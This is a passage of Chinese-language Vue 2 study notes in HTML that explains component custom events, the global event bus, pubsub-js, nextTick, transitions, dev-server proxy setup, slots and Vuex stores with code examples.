function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>studentget<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'myThing'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>myThingRun <span class="token punctuation">)</span> <span class="token comment">//绑定自定义事件myThing(绑定是绑定在student实例上的)</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>绑定自定义事件：</p><ol><li><p>第一种方式，在父组件中：<code>&lt;Demo @ahh=&quot;test&quot;/&gt;</code>  或 <code>&lt;Demo v-on:ahh=&quot;test&quot;/&gt;</code></p></li><li><p>第二种方式，在父组件中：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>Demo ref<span class="token operator">=</span><span class="token string">"demo"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">...</span><span class="token operator">...</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'ahh'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>test<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>若想让自定义事件只能触发一次，可以使用<code>once</code>修饰符，或<code>$once</code>方法。</p></li></ol></li><li><p>触发自定义事件：<code>this.$emit(&#39;atguigu&#39;,数据)</code>        </p></li><li><p>解绑自定义事件<code>this.$off(&#39;atguigu&#39;)</code></p></li><li><p>组件上也可以绑定原生DOM事件，需要使用<code>native</code>修饰符。</p></li><li><p>注意：通过<code>this.$refs.xxx.$on(&#39;atguigu&#39;,回调)</code>绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！</p></li></ol><h3 id="全局事件总线"><a href="#全局事件总线" class="headerlink" title="全局事件总线"></a>全局事件总线</h3><p>用以实现任意组件间通信，使用一个所有组件都能使用的中间桥梁来实现组件间通信，实现方式：</p><ol><li>安装注册全局事件总线：</li></ol><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token operator">...</span>    <span class="token function">beforeCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Vue<span class="token punctuation">.</span>prototye<span class="token punctuation">.</span>$bus <span class="token operator">=</span> <span class="token keyword">this</span><span class="token comment">//安装注册全局事件总线，$bus就是当前vm</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>使用事件总线：在组件A中想要接收来自另一个组件B的数据，则需要在组建中给$bus绑定自定义事件，并回调函数在A中</li></ol><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//A组件</span><span class="token operator">...</span><span class="token literal-property property">methods</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token operator">...</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//绑定自定义事件ahh,通过回调函数接收数据</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>$bus<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'ahh'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>demo<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>提供数据：B通过调用自定义事件ahh来提供数据123</li></ol><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'ahh'</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>最好在beforeDestory钩子中用 $off解除绑定，释放自定义事件名称</li></ol><h3 id="消息订阅与发布"><a href="#消息订阅与发布" class="headerlink" title="消息订阅与发布"></a>消息订阅与发布</h3><p>也是一种组件间通信技术，通过外部第三方库来实现，这里使用pubsub-js库来实现</p><p>通过npm i pubsub -js安装，安装后引入:<code>import pubsub from &#39;pubsub-js&#39;</code></p><p>使用方式如下：若A组件要接收B的消息，则在A中订阅，回调函数也在A中：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//A组件</span><span class="token operator">...</span><span class="token literal-property property">methods</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">msgName<span class="token punctuation">,</span>data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token operator">...</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//订阅事件ahh,收到一个id，用于后面销毁，调用回调函数demo，接收参数</span><span class="token keyword">this</span><span class="token punctuation">.</span>pubId <span class="token operator">=</span> pubsub<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token string">'ahh'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>demo<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发布消息：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//B组件，666是A接收到的data，msgName是ahh</span>pubsub<span class="token punctuation">.</span><span class="token function">publish</span><span class="token punctuation">(</span><span class="token string">'ahh'</span><span class="token punctuation">,</span><span class="token number">666</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="nextTick"><a href="#nextTick" class="headerlink" title="nextTick"></a>nextTick</h3><ol><li>语法：<code>this.$nextTick(回调函数)</code></li><li>作用：在下一次 DOM 更新结束后执行其指定的回调。</li><li>什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。</li></ol><h3 id="Vue封装的过度与动画"><a href="#Vue封装的过度与动画" class="headerlink" title="Vue封装的过度与动画"></a>Vue封装的过度与动画</h3><ol><li><p>作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。</p></li><li><p>写法：</p><ol><li><p>准备好样式：</p><ul><li>元素进入的样式：<ol><li>v-enter：进入的起点</li><li>v-enter-active：进入过程中</li><li>v-enter-to：进入的终点</li></ol></li><li>元素离开的样式：<ol><li>v-leave：离开的起点</li><li>v-leave-active：离开过程中</li><li>v-leave-to：离开的终点</li></ol></li></ul></li><li><p>使用<code>&lt;transition&gt;</code>包裹要过度的元素，并配置name属性：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;transition name&#x3D;&quot;hello&quot;&gt;&lt;h1 v-show&#x3D;&quot;isShow&quot;&gt;你好啊！&lt;&#x2F;h1&gt;&lt;&#x2F;transition&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>备注：若有多个元素需要过度，则需要使用：<code>&lt;transition-group&gt;</code>，且每个元素都要指定<code>key</code>值。</p></li></ol></li></ol><h3 id="vue脚手架配置代理"><a href="#vue脚手架配置代理" class="headerlink" title="vue脚手架配置代理"></a>vue脚手架配置代理</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>​    在vue.config.js中添加如下配置：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//服务器端口在5000</span><span class="token literal-property property">devServer</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>  <span class="token literal-property property">proxy</span><span class="token operator">:</span><span class="token string">"http://localhost:5000"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>说明：</p><ol><li>优点：配置简单，请求资源时直接发给前端（8080）即可。</li><li>缺点：不能配置多个代理，不能灵活的控制请求是否走代理。</li><li>工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）</li></ol><p>进行请求时：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//注意，因为配置了代理服务器，所以这里是像代理服务器发起请求，即前端的8080端口，而不是5000的服务器端口</span>axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'http:localhost:8080/student'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>​    编写vue.config.js配置具体代理规则：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">devServer</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">proxy</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token string-property property">'/api1'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token comment">// 匹配所有以 '/api1'开头的请求路径</span>        <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">'http://localhost:5000'</span><span class="token punctuation">,</span><span class="token comment">// 代理目标的基础路径</span>        <span class="token literal-property property">changeOrigin</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token literal-property property">pathRewrite</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'^/api1'</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">&#125;</span><span class="token comment">//将api1替换为空，如果不写，则服务器收到的请求是/api1/student,但服务器想要收到的请求是/student</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token string-property property">'/api2'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token comment">// 匹配所有以 '/api2'开头的请求路径</span>        <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">'http://localhost:5001'</span><span class="token punctuation">,</span><span class="token comment">// 代理目标的基础路径</span>        <span class="token literal-property property">changeOrigin</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token literal-property property">pathRewrite</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'^/api2'</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080   changeOrigin默认值为true*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进行请求时：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//注意，因为配置了代理服务器，所以这里是像代理服务器发起请求，即前端的8080端口，而不是5000的服务器端口</span>axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'http:localhost:8080/api1/student'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>说明：</p><ol><li>优点：可以配置多个代理，且可以灵活的控制请求是否走代理。</li><li>缺点：配置略微繁琐，请求资源时必须加前缀。</li></ol><h3 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h3><ol><li><p>作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===&gt; 子组件</strong> 。</p></li><li><p>分类：默认插槽、具名插槽、作用域插槽</p></li><li><p>使用方式：</p><ol><li><p>默认插槽：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">父组件中：        &lt;Category&gt;           &lt;div&gt;html结构1&lt;&#x2F;div&gt;&#x2F;&#x2F;这一行里的内容就会替代下方slot中的        &lt;&#x2F;Category&gt;子组件Category中：        &lt;template&gt;            &lt;div&gt;               &lt;!-- 定义插槽，html结构1就会替换插槽的内容 --&gt;               &lt;slot&gt;插槽默认内容...&lt;&#x2F;slot&gt;            &lt;&#x2F;div&gt;        &lt;&#x2F;template&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>具名插槽：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">父组件中：        &lt;Category&gt;            &lt;template slot&#x3D;&quot;center&quot;&gt;              &lt;div&gt;html结构1&lt;&#x2F;div&gt;            &lt;&#x2F;template&gt;            &lt;template v-slot:footer&gt;               &lt;div&gt;html结构2&lt;&#x2F;div&gt;            &lt;&#x2F;template&gt;        &lt;&#x2F;Category&gt;子组件中：        &lt;template&gt;            &lt;div&gt;               &lt;!-- 定义插槽 --&gt;               &lt;slot name&#x3D;&quot;center&quot;&gt;插槽默认内容...&lt;&#x2F;slot&gt;               &lt;slot name&#x3D;&quot;footer&quot;&gt;插槽默认内容...&lt;&#x2F;slot&gt;            &lt;&#x2F;div&gt;        &lt;&#x2F;template&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>作用域插槽：</p><ol><li><p>理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）</p></li><li><p>具体编码：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">父组件中：&lt;Category&gt;&lt;template scope&#x3D;&quot;scopeData&quot;&gt;&lt;!-- 生成的是ul列表 --&gt;&lt;ul&gt;&lt;li v-for&#x3D;&quot;g in scopeData.games&quot; :key&#x3D;&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;&#x2F;li&gt;&lt;&#x2F;ul&gt;&lt;&#x2F;template&gt;&lt;&#x2F;Category&gt;&lt;Category&gt;&lt;template slot-scope&#x3D;&quot;scopeData&quot;&gt;&lt;!-- 生成的是h4标题 --&gt;&lt;h4 v-for&#x3D;&quot;g in scopeData.games&quot; :key&#x3D;&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;&#x2F;h4&gt;&lt;&#x2F;template&gt;&lt;&#x2F;Category&gt;子组件中：        &lt;template&gt;            &lt;div&gt;                &lt;slot :games&#x3D;&quot;games&quot;&gt;&lt;&#x2F;slot&gt;            &lt;&#x2F;div&gt;        &lt;&#x2F;template&gt;        &lt;script&gt;            export default &#123;                name:&#39;Category&#39;,                props:[&#39;title&#39;],                &#x2F;&#x2F;数据在子组件自身                data() &#123;                    return &#123;                        games:[&#39;红色警戒&#39;,&#39;穿越火线&#39;,&#39;劲舞团&#39;,&#39;超级玛丽&#39;]                    &#125;                &#125;,            &#125;        &lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li></ol></li></ol><h2 id="vuex"><a href="#vuex" class="headerlink" title="vuex"></a>vuex</h2><p>概念：在vue中专门用于实现集中式状态（数据）管理的一个Vue<strong>插件</strong>，在多个组件需要共享数据时使用，vue的工作流程如图：</p><p><img src="/images/image-20220302102221887.png"></p><p>组件需要的数据在state中，想要请求修改数据，组件通过dispatch向vuex提出请求，actions提交其请求，mutations执行请求修改state，</p><h3 id="搭建vuex环境"><a href="#搭建vuex环境" class="headerlink" title="搭建vuex环境"></a>搭建vuex环境</h3><ol><li><p>创建文件：<code>src/store/index.js</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//引入Vue核心库</span><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token comment">//引入Vuex</span><span class="token keyword">import</span> Vuex <span class="token keyword">from</span> <span class="token string">'vuex'</span><span class="token comment">//应用Vuex插件</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>Vuex<span class="token punctuation">)</span><span class="token comment">//准备actions对象——响应组件中用户的动作</span><span class="token keyword">const</span> actions <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token comment">//准备mutations对象——修改state中的数据</span><span class="token keyword">const</span> mutations <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token comment">//准备state对象——保存具体的数据</span><span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token comment">//创建并暴露store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>actions<span class="token punctuation">,</span>mutations<span class="token punctuation">,</span>state<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在<code>main.js</code>中创建vm时传入<code>store</code>配置项</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token operator">...</span><span class="token comment">//引入store</span><span class="token keyword">import</span> store <span class="token keyword">from</span> <span class="token string">'./store'</span><span class="token operator">...</span><span class="token operator">...</span><span class="token comment">//创建vm</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">el</span><span class="token operator">:</span><span class="token string">'#app'</span><span class="token punctuation">,</span><span class="token function-variable function">render</span><span class="token operator">:</span> <span class="token parameter">h</span> <span class="token operator">=></span> <span class="token function">h</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span><span class="token punctuation">,</span>store<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><ol><li><p>初始化数据、配置<code>actions</code>、配置<code>mutations</code>，操作文件<code>store.js</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//引入Vue核心库</span><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token comment">//引入Vuex</span><span class="token keyword">import</span> Vuex <span class="token keyword">from</span> <span class="token string">'vuex'</span><span class="token comment">//引用Vuex</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>Vuex<span class="token punctuation">)</span><span class="token keyword">const</span> actions <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//响应组件中加的动作，组件中的方法会请求jia调用，即：$store.dispatch('jia',123)</span><span class="token function">jia</span><span class="token punctuation">(</span><span class="token parameter">context<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// console.log('actions中的jia被调用了',miniStore,value)</span>context<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'JIA'</span><span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> mutations <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//执行加</span><span class="token constant">JIA</span><span class="token punctuation">(</span><span class="token parameter">state<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// console.log('mutations中的JIA被调用了',state,value)</span>state<span class="token punctuation">.</span>sum <span class="token operator">+=</span> value<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//初始化数据</span><span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token punctuation">&#123;</span>   <span class="token literal-property property">sum</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token comment">//创建并暴露store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>actions<span class="token punctuation">,</span>mutations<span class="token punctuation">,</span>state<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>组件中读取vuex中的数据：<code>$store.state.sum</code></p></li><li><p>组件中修改vuex中的数据：<code>$store.dispatch(&#39;action中的方法名&#39;,数据)</code> 或 <code>$store.commit(&#39;mutations中的方法名&#39;,数据)</code></p><blockquote><p> 备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写<code>dispatch</code>，直接编写<code>commit</code></p></blockquote></li></ol><h3 id="getters的使用"><a href="#getters的使用" class="headerlink" title="getters的使用"></a>getters的使用</h3><p>也是vuex中的一个配置项</p><ol><li><p>概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。</p></li><li><p>在<code>store.js</code>中追加<code>getters</code>配置</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token operator">...</span><span class="token keyword">const</span> getters <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token function">bigSum</span><span class="token punctuation">(</span><span class="token parameter">state</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> state<span class="token punctuation">.</span>sum <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//创建并暴露store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token operator">...</span>getters<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>组件中读取数据：<code>$store.getters.bigSum</code></p></li></ol><h3 id="四个map方法的使用"><a href="#四个map方法的使用" class="headerlink" title="四个map方法的使用"></a>四个map方法的使用</h3><ol><li><p><strong>mapState方法：</strong>用于帮助我们映射<code>state</code>中的数据为计算属性</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">computed</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//借助mapState生成计算属性：sum、school、subject（对象写法）</span>     <span class="token operator">...</span><span class="token function">mapState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">sum</span><span class="token operator">:</span><span class="token string">'sum'</span><span class="token punctuation">,</span><span class="token literal-property property">school</span><span class="token operator">:</span><span class="token string">'school'</span><span class="token punctuation">,</span><span class="token literal-property property">subject</span><span class="token operator">:</span><span class="token string">'subject'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//在computed对象中，mapState也是对象，所以需要ES6写法：...  不然无法正确读取，这样映射了计算属性后就可以在模板语法中直接写sum，而不是$store.state.sum了，也可以自己写sum等的计算属性，但最好是直接用这些已经封装好的方法</span>             <span class="token comment">//借助mapState生成计算属性：sum、school、subject（数组写法）</span>    <span class="token operator">...</span><span class="token function">mapState</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'sum'</span><span class="token punctuation">,</span><span class="token string">'school'</span><span class="token punctuation">,</span><span class="token string">'subject'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mapGetters方法：</strong>用于帮助我们映射<code>getters</code>中的数据为计算属性</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">computed</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//借助mapGetters生成计算属性：bigSum（对象写法）</span>    <span class="token operator">...</span><span class="token function">mapGetters</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">bigSum</span><span class="token operator">:</span><span class="token string">'bigSum'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">//借助mapGetters生成计算属性：bigSum（数组写法）</span>    <span class="token operator">...</span><span class="token function">mapGetters</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'bigSum'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mapActions方法：</strong>用于帮助我们生成与<code>actions</code>对话的方法，即：包含<code>$store.dispatch(xxx)</code>的函数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">methods</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token comment">//靠mapActions生成：incrementOdd、incrementWait（对象形式）</span>    <span class="token operator">...</span><span class="token function">mapActions</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">incrementOdd</span><span class="token operator">:</span><span class="token string">'jiaOdd'</span><span class="token punctuation">,</span><span class="token literal-property property">incrementWait</span><span class="token operator">:</span><span class="token string">'jiaWait'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment">//靠mapActions生成：incrementOdd、incrementWait（数组形式）</span>    <span class="token operator">...</span><span class="token function">mapActions</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'jiaOdd'</span><span class="token punctuation">,</span><span class="token string">'jiaWait'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mapMutations方法：</strong>用于帮助我们生成与<code>mutations</code>对话的方法，即：包含<code>$store.commit(xxx)</code>的函数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">methods</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token comment">//靠mapActions生成：increment、decrement（对象形式）</span>    <span class="token operator">...</span><span class="token function">mapMutations</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">increment</span><span class="token operator">:</span><span class="token string">'JIA'</span><span class="token punctuation">,</span><span class="token literal-property property">decrement</span><span class="token operator">:</span><span class="token string">'JIAN'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment">//靠mapMutations生成：JIA、JIAN（对象形式）</span>    <span class="token operator">...</span><span class="token function">mapMutations</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'JIA'</span><span class="token punctuation">,</span><span class="token string">'JIAN'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 